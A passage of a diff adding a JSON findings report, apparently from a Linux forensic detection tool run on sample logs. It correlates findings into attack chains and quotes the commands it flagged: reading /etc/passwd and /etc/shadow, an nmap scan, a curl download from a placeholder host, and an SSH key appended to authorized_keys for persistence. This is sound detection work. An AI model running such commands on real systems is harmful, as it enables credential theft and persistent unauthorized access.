+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "privilege_change": true,
+                "root_target": true
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0001",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+            "severity": "HIGH",
+            "username": null,
+            "command": "cat /etc/passwd",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "BASH-00004",
+            "timestamp": "2025-10-11T15:41:28+00:00",
+            "indicators": [
+                "/etc/passwd",
+                "passwd"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0002",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+            "severity": "HIGH",
+            "username": null,
+            "command": "cat /etc/shadow",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "BASH-00005",
+            "timestamp": "2025-10-11T15:41:30+00:00",
+            "indicators": [
+                "/etc/shadow",
+                "shadow"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0003",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Network Reconnaissance Command",
+            "description": "The command contains a network discovery or connection utility. Observed command: ss -tulnp",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "ss -tulnp",
+            "source_ip": null,
+            "category": "NETWORK_RECON",
+            "event_id": "BASH-00006",
+            "timestamp": "2025-10-11T15:41:32+00:00",
+            "indicators": [
+                "ss -"
+            ],
+            "metadata": {
+                "rule_category": "NETWORK_RECON",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0004",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Network Reconnaissance Command",
+            "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "source_ip": null,
+            "category": "NETWORK_RECON",
+            "event_id": "BASH-00007",
+            "timestamp": "2025-10-11T15:41:34+00:00",
+            "indicators": [
+                "nmap "
+            ],
+            "metadata": {
+                "rule_category": "NETWORK_RECON",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0005",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Suspicious File Download Command",
+            "description": "A command capable of downloading remote content was executed. Observed command: curl -O https://example.invalid/update.bin",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "curl -O https://example.invalid/update.bin",
+            "source_ip": null,
+            "category": "DOWNLOAD",
+            "event_id": "BASH-00008",
+            "timestamp": "2025-10-11T15:41:37+00:00",
+            "indicators": [
+                "curl "
+            ],
+            "metadata": {
+                "rule_category": "DOWNLOAD",
+                "source": "bash_history",
+                "original_event_type": "DOWNLOAD",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0006",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "severity": "HIGH",
+            "username": null,
+            "command": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "BASH-00009",
+            "timestamp": "2025-10-11T15:41:40+00:00",
+            "indicators": [
+                ".ssh/authorized_keys"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0007",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: /usr/bin/cat /etc/shadow",
+            "severity": "HIGH",
+            "username": "admin",
+            "command": "/usr/bin/cat /etc/shadow",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "SUDO-00002",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "indicators": [
+                "/etc/shadow",
+                "shadow"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "sudo",
+                "original_event_type": "SUDO_COMMAND",
+                "sudo_context": true
+            }
+        },
+        {
+            "finding_id": "PERSISTENCE-0001",
+            "event_type": "PERSISTENCE_DETECTED",
+            "title": "SSH Authorized Keys Persistence",
+            "description": "The command references an SSH authorized_keys file, which may be used to establish persistent SSH access. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "severity": "HIGH",
+            "category": "SSH_AUTHORIZED_KEYS",
+            "username": null,
+            "command": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "source_ip": null,
+            "event_id": "BASH-00009",
+            "timestamp": "2025-10-11T15:41:40+00:00",
+            "indicators": [
+                "authorized_keys",
+                ".ssh/authorized_keys"
+            ],
+            "metadata": {
+                "rule_category": "SSH_AUTHORIZED_KEYS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "NETWORK-ACTIVITY-0001",
+            "event_type": "NETWORK_ACTIVITY",
+            "title": "Network Connection Enumeration",
+            "description": "The command enumerates active or listening network connections. Observed command: ss -tulnp",
+            "severity": "MEDIUM",
+            "category": "CONNECTION_ENUMERATION",
+            "username": null,
+            "command": "ss -tulnp",
+            "source_ip": null,
+            "destination_ip": null,
+            "destination_port": null,
+            "event_id": "BASH-00006",
+            "timestamp": "2025-10-11T15:41:32+00:00",
+            "indicators": [
+                "ss -"
+            ],
+            "metadata": {
+                "rule_category": "CONNECTION_ENUMERATION",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "NETWORK-ACTIVITY-0002",
+            "event_type": "NETWORK_ACTIVITY",
+            "title": "Potential Port Scanning Activity",
+            "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+            "severity": "HIGH",
+            "category": "PORT_SCAN",
+            "username": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "source_ip": null,
+            "destination_ip": null,
+            "destination_port": null,
+            "event_id": "BASH-00007",
+            "timestamp": "2025-10-11T15:41:34+00:00",
+            "indicators": [
+                "nmap "
+            ],
+            "metadata": {
+                "rule_category": "PORT_SCAN",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        }
+    ],
+    "attack_chains": [
+        {
+            "chain_id": "CHAIN-0001",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:28+00:00",
+            "end_time": "2025-10-11T15:41:28+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0001-STEP-01",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+                    "timestamp": "2025-10-11T15:41:28+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00004"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0001"
+                    ],
+                    "indicators": [
+                        "/etc/passwd",
+                        "passwd"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0001"
+            ],
+            "event_ids": [
+                "BASH-00004"
+            ],
+            "metadata": {
+                "stages": [
+                    "CREDENTIAL_ACCESS"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0002",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:30+00:00",
+            "end_time": "2025-10-11T15:41:30+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0002-STEP-01",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+                    "timestamp": "2025-10-11T15:41:30+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00005"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0002"
+                    ],
+                    "indicators": [
+                        "/etc/shadow",
+                        "shadow"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0002"
+            ],
+            "event_ids": [
+                "BASH-00005"
+            ],
+            "metadata": {
+                "stages": [
+                    "CREDENTIAL_ACCESS"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0003",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+            "severity": "MEDIUM",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:32+00:00",
+            "end_time": "2025-10-11T15:41:32+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0003-STEP-01",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Network Reconnaissance Command",
+                    "description": "The command contains a network discovery or connection utility. Observed command: ss -tulnp",
+                    "timestamp": "2025-10-11T15:41:32+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00006"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0003"
+                    ],
+                    "indicators": [
+                        "ss -"
+                    ],
+                    "metadata": {
+                        "category": "NETWORK_RECON",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0003"
+            ],
+            "event_ids": [
+                "BASH-00006"
+            ],
+            "metadata": {
+                "stages": [
+                    "RECONNAISSANCE"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0004",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+            "severity": "MEDIUM",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:32+00:00",
+            "end_time": "2025-10-11T15:41:32+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0004-STEP-01",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Network Connection Enumeration",
+                    "description": "The command enumerates active or listening network connections. Observed command: ss -tulnp",
+                    "timestamp": "2025-10-11T15:41:32+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00006"
+                    ],
+                    "finding_ids": [
+                        "NETWORK-ACTIVITY-0001"
+                    ],
+                    "indicators": [
+                        "ss -"
+                    ],
+                    "metadata": {
+                        "category": "CONNECTION_ENUMERATION",
+                        "event_type": "NETWORK_ACTIVITY",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0001"
+            ],
+            "event_ids": [
+                "BASH-00006"
+            ],
+            "metadata": {
+                "stages": [
+                    "RECONNAISSANCE"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0005",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+            "severity": "MEDIUM",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:34+00:00",
+            "end_time": "2025-10-11T15:41:34+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0005-STEP-01",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Network Reconnaissance Command",
+                    "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+                    "timestamp": "2025-10-11T15:41:34+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00007"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0004"
+                    ],
+                    "indicators": [
+                        "nmap "
+                    ],
+                    "metadata": {
+                        "category": "NETWORK_RECON",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0004"
+            ],
+            "event_ids": [
+                "BASH-00007"
+            ],
+            "metadata": {
+                "stages": [
+                    "RECONNAISSANCE"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0006",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across RECONNAISSANCE involving an unidentified user from an unidentified source.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:34+00:00",
+            "end_time": "2025-10-11T15:41:34+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0006-STEP-01",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Port Scanning Activity",
+                    "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+                    "timestamp": "2025-10-11T15:41:34+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00007"
+                    ],
+                    "finding_ids": [
+                        "NETWORK-ACTIVITY-0002"
+                    ],
+                    "indicators": [
+                        "nmap "
+                    ],
+                    "metadata": {
+                        "category": "PORT_SCAN",
+                        "event_type": "NETWORK_ACTIVITY",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0002"
+            ],
+            "event_ids": [
+                "BASH-00007"
+            ],
+            "metadata": {
+                "stages": [
+                    "RECONNAISSANCE"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0007",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across COMMAND_AND_CONTROL involving an unidentified user from an unidentified source.",
+            "severity": "MEDIUM",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:37+00:00",
+            "end_time": "2025-10-11T15:41:37+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0007-STEP-01",
+                    "stage": "COMMAND_AND_CONTROL",
+                    "title": "Suspicious File Download Command",
+                    "description": "A command capable of downloading remote content was executed. Observed command: curl -O https://example.invalid/update.bin",
+                    "timestamp": "2025-10-11T15:41:37+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00008"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0005"
+                    ],
+                    "indicators": [
+                        "curl "
+                    ],
+                    "metadata": {
+                        "category": "DOWNLOAD",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0005"
+            ],
+            "event_ids": [
+                "BASH-00008"
+            ],
+            "metadata": {
+                "stages": [
+                    "COMMAND_AND_CONTROL"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0008",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across CREDENTIAL_ACCESS involving an unidentified user from an unidentified source.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:40+00:00",
+            "end_time": "2025-10-11T15:41:40+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0008-STEP-01",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+                    "timestamp": "2025-10-11T15:41:40+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00009"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0006"
+                    ],
+                    "indicators": [
+                        ".ssh/authorized_keys"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0006"
+            ],
+            "event_ids": [
+                "BASH-00009"
+            ],
+            "metadata": {
+                "stages": [
+                    "CREDENTIAL_ACCESS"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0009",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 1 correlated activity step(s) across PERSISTENCE involving an unidentified user from an unidentified source.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2025-10-11T15:41:40+00:00",
+            "end_time": "2025-10-11T15:41:40+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0009-STEP-01",
+                    "stage": "PERSISTENCE",
+                    "title": "SSH Authorized Keys Persistence",
+                    "description": "The command references an SSH authorized_keys file, which may be used to establish persistent SSH access. Observed command: echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+                    "timestamp": "2025-10-11T15:41:40+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00009"
+                    ],
+                    "finding_ids": [
+                        "PERSISTENCE-0001"
+                    ],
+                    "indicators": [
+                        "authorized_keys",
+                        ".ssh/authorized_keys"
+                    ],
+                    "metadata": {
+                        "category": "SSH_AUTHORIZED_KEYS",
+                        "event_type": "PERSISTENCE_DETECTED",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "PERSISTENCE-0001"
+            ],
+            "event_ids": [
+                "BASH-00009"
+            ],
+            "metadata": {
+                "stages": [
+                    "PERSISTENCE"
+                ],
+                "finding_count": 1,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": []
+            }
+        },
+        {
+            "chain_id": "CHAIN-0010",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 5 correlated activity step(s) across PRIVILEGE_ESCALATION, CREDENTIAL_ACCESS involving user admin, root from an unidentified source. Cross-evidence correlation linked 2 investigation signal(s).",
+            "severity": "CRITICAL",
+            "confidence": 100,
+            "start_time": "2026-10-06T15:41:24+00:00",
+            "end_time": "2026-10-06T15:41:32+00:00",
+            "source_ips": [],
+            "usernames": [
+                "admin",
+                "root"
+            ],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0010-STEP-01",
+                    "stage": "PRIVILEGE_ESCALATION",
+                    "title": "Potential Privilege Escalation Detected",
+                    "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                    "timestamp": "2026-10-06T15:41:24+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "SUDO-00001"
+                    ],
+                    "finding_ids": [
+                        "PRIV-ESC-0001"
+                    ],
+                    "indicators": [
+                        "sudo",
+                        "target_user=root"
+                    ],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "PRIVILEGE_ESCALATION",
+                        "source": null,
+                        "evidence_sources": [
+                            "sudo"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0010-STEP-02",
+                    "stage": "PRIVILEGE_ESCALATION",
+                    "title": "Potential Privilege Escalation Detected",
+                    "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                    "timestamp": "2026-10-06T15:41:26+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "SUDO-00002"
+                    ],
+                    "finding_ids": [
+                        "PRIV-ESC-0002"
+                    ],
+                    "indicators": [
+                        "sudo",
+                        "target_user=root"
+                    ],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "PRIVILEGE_ESCALATION",
+                        "source": null,
+                        "evidence_sources": [
+                            "sudo"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0010-STEP-03",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: /usr/bin/cat /etc/shadow",
+                    "timestamp": "2026-10-06T15:41:26+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "SUDO-00002"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0007"
+                    ],
+                    "indicators": [
+                        "/etc/shadow",
+                        "shadow"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "sudo"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0010-STEP-04",
+                    "stage": "PRIVILEGE_ESCALATION",
+                    "title": "Potential Privilege Escalation Detected",
+                    "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                    "timestamp": "2026-10-06T15:41:29+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "SUDO-00003"
+                    ],
+                    "finding_ids": [
+                        "PRIV-ESC-0003"
+                    ],
+                    "indicators": [
+                        "sudo",
+                        "target_user=root"
+                    ],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "PRIVILEGE_ESCALATION",
+                        "source": null,
+                        "evidence_sources": [
+                            "sudo"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0010-STEP-05",
+                    "stage": "PRIVILEGE_ESCALATION",
+                    "title": "Potential Privilege Escalation Detected",
+                    "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                    "timestamp": "2026-10-06T15:41:32+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "SUDO-00004"
+                    ],
+                    "finding_ids": [
+                        "PRIV-ESC-0004"
+                    ],
+                    "indicators": [
+                        "sudo",
+                        "target_user=root"
+                    ],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "PRIVILEGE_ESCALATION",
+                        "source": null,
+                        "evidence_sources": [
+                            "sudo"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "PRIV-ESC-0001",
+                "PRIV-ESC-0002",
+                "SUSPICIOUS-CMD-0007",
+                "PRIV-ESC-0003",
+                "PRIV-ESC-0004"
+            ],
+            "event_ids": [
+                "SUDO-00001",
+                "SUDO-00002",
+                "SUDO-00003",
+                "SUDO-00004"
+            ],
+            "metadata": {
+                "stages": [
+                    "PRIVILEGE_ESCALATION",
+                    "CREDENTIAL_ACCESS"
+                ],
+                "finding_count": 5,
+                "event_count": 4,
+                "evidence_sources": [
+                    "sudo"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": [
+                    {
+                        "type": "IDENTITY_CORRELATION",
+                        "reason": "Findings share one or more user identities.",
+                        "users": [
+                            "admin",
+                            "root"
+                        ],
+                        "confidence": 85
+                    },
+                    {
+                        "type": "TEMPORAL_CORRELATION",
+                        "reason": "Related findings occurred within the investigation window.",
+                        "duration_seconds": 8.0,
+                        "confidence": 75
+                    }
+                ]
+            }
+        },
+        {
+            "chain_id": "CHAIN-0011",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Investigation identified 3 correlated activity step(s) across INITIAL_ACCESS, PRIVILEGE_ESCALATION involving user admin, root from source 192.0.2.50. Cross-evidence correlation linked 3 investigation signal(s).",
+            "severity": "CRITICAL",
+            "confidence": 85,
+            "start_time": "2026-10-06T22:14:03+00:00",
+            "end_time": "2026-10-06T22:16:14+00:00",
+            "source_ips": [
+                "192.0.2.50"
+            ],
+            "usernames": [
+                "admin",
+                "root"
+            ],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0011-STEP-01",
+                    "stage": "INITIAL_ACCESS",
+                    "title": "SSH Brute-Force Activity Detected",
+                    "description": "4 failed SSH authentication attempts were detected from 192.0.2.50 against user admin within 300 seconds.",
+                    "timestamp": "2026-10-06T22:14:03+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "AUTH-00001",
+                        "AUTH-00002",
+                        "AUTH-00003",
+                        "AUTH-00004"
+                    ],
+                    "finding_ids": [
+                        "BRUTE-FORCE-0001"
+                    ],
+                    "indicators": [],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "SSH_BRUTE_FORCE",
+                        "source": null,
+                        "evidence_sources": [
+                            "auth.log"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0011-STEP-02",
+                    "stage": "INITIAL_ACCESS",
+                    "title": "Successful SSH Login After Brute-Force Activity",
+                    "description": "4 failed SSH authentication attempts from 192.0.2.50 against user admin were followed by a successful SSH authentication.",
+                    "timestamp": "2026-10-06T22:14:03+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "AUTH-00001",
+                        "AUTH-00002",
+                        "AUTH-00003",
+                        "AUTH-00004",
+                        "AUTH-00005",
+                        "AUTH-00006"
+                    ],
+                    "finding_ids": [
+                        "BRUTE-FORCE-SUCCESS-0001"
+                    ],
+                    "indicators": [],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "SSH_BRUTE_FORCE_SUCCESS",
+                        "source": null,
+                        "evidence_sources": [
+                            "auth.log"
+                        ]
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0011-STEP-03",
+                    "stage": "PRIVILEGE_ESCALATION",
+                    "title": "Potential Privilege Escalation Detected",
+                    "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                    "timestamp": "2026-10-06T22:16:14+00:00",
+                    "severity": "CRITICAL",
+                    "event_ids": [
+                        "AUTH-00007"
+                    ],
+                    "finding_ids": [
+                        "PRIV-ESC-0005"
+                    ],
+                    "indicators": [
+                        "sudo",
+                        "target_user=root"
+                    ],
+                    "metadata": {
+                        "category": null,
+                        "event_type": "PRIVILEGE_ESCALATION",
+                        "source": null,
+                        "evidence_sources": [
+                            "auth.log"
+                        ]
+                    }
+                }
+            ],
+            "finding_ids": [
+                "BRUTE-FORCE-0001",
+                "BRUTE-FORCE-SUCCESS-0001",
+                "PRIV-ESC-0005"
+            ],
+            "event_ids": [
+                "AUTH-00001",
+                "AUTH-00002",
+                "AUTH-00003",
+                "AUTH-00004",
+                "AUTH-00005",
+                "AUTH-00006",
+                "AUTH-00007"
+            ],
+            "metadata": {
+                "stages": [
+                    "INITIAL_ACCESS",
